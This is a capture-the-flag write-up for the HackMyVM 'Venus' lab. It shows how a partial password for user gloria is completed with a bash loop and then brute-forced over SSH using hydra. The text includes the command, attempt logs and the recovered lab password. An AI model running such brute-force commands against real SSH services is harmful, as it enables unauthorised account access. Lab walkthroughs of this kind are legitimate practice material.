# Target User
gloria  -pass: v7xUVE2e5bjUcxw

# Method of Solve
- Login using the ssh credentials
- Perform ls -la to list all the files and cat mission.txt
- Copy the incomplete password into our local machine and use bash script to create all the possible combination of missing characters in the password
  ```
    ┌──(kali㉿kali)-[~/hack_my_vm/hvmlabs/venus]
    └─$ for i in {a..z}{a..z}; do echo "v7xUVE2e5bjUc$i"; done > 35_maia_gloria_passwords.txt
  ```
- Then Use this passwords file to brute force ssh login using hydra
  ```
    ┌──(kali㉿kali)-[~/hack_my_vm/hvmlabs/venus]
    └─$ hydra -V -t 32 -l gloria -P 35_maia_gloria_passwords.txt ssh://venus.hackmyvm.eu:5000
  ```
- The Result will show the password once successfully logged in
  ```
    .
    .
    .
    .
    [ATTEMPT] target venus.hackmyvm.eu - login "gloria" - pass "v7xUVE2e5bjUcxt" - 618 of 686 [child 26] (0/10)
    [ATTEMPT] target venus.hackmyvm.eu - login "gloria" - pass "v7xUVE2e5bjUcxu" - 619 of 686 [child 5] (0/10)
    [ATTEMPT] target venus.hackmyvm.eu - login "gloria" - pass "v7xUVE2e5bjUcxv" - 620 of 686 [child 22] (0/10)
    [ATTEMPT] target venus.hackmyvm.eu - login "gloria" - pass "v7xUVE2e5bjUcxw" - 621 of 686 [child 23] (0/10)
    [ATTEMPT] target venus.hackmyvm.eu - login "gloria" - pass "v7xUVE2e5bjUcxx" - 622 of 686 [child 0] (0/10)
    [ATTEMPT] target venus.hackmyvm.eu - login "gloria" - pass "v7xUVE2e5bjUcxy" - 623 of 686 [child 27] (0/10)
    [RE-ATTEMPT] target venus.hackmyvm.eu - login "gloria" - pass "v7xUVE2e5bjUcxd" - 623 of 686 [child 19] (0/10)
    [ATTEMPT] target venus.hackmyvm.eu - login "gloria" - pass "v7xUVE2e5bjUcxz" - 624 of 686 [child 30] (0/10)
    [RE-ATTEMPT] target venus.hackmyvm.eu - login "gloria" - pass "v7xUVE2e5bjUcxd" - 624 of 686 [child 19] (0/10)
    [ATTEMPT] target venus.hackmyvm.eu - login "gloria" - pass "v7xUVE2e5bjUcya" - 625 of 686 [child 4] (0/10)
    [RE-ATTEMPT] target venus.hackmyvm.eu - login "gloria" - pass "v7xUVE2e5bjUcxd" - 625 of 686 [child 19] (0/10)
    [ATTEMPT] target venus.hackmyvm.eu - login "gloria" - pass "v7xUVE2e5bjUcyb" - 626 of 686 [child 13] (0/10)
    [ATTEMPT] target venus.hackmyvm.eu - login "gloria" - pass "v7xUVE2e5bjUcyc" - 627 of 686 [child 6] (0/10)
    [ATTEMPT] target venus.hackmyvm.eu - login "gloria" - pass "v7xUVE2e5bjUcyd" - 628 of 686 [child 28] (0/10)
    [ATTEMPT] target venus.hackmyvm.eu - login "gloria" - pass "v7xUVE2e5bjUcye" - 629 of 686 [child 15] (0/10)
    [5000][ssh] host: venus.hackmyvm.eu   login: gloria   password: v7xUVE2e5bjUcxw
    1 of 1 target successfully completed, 1 valid password found
    .
    .
    .
    .
  ```
- The password is **v7xUVE2e5bjUcxw**

# Commands Used
- ls -la
- cat
- bash scripts
- hydra
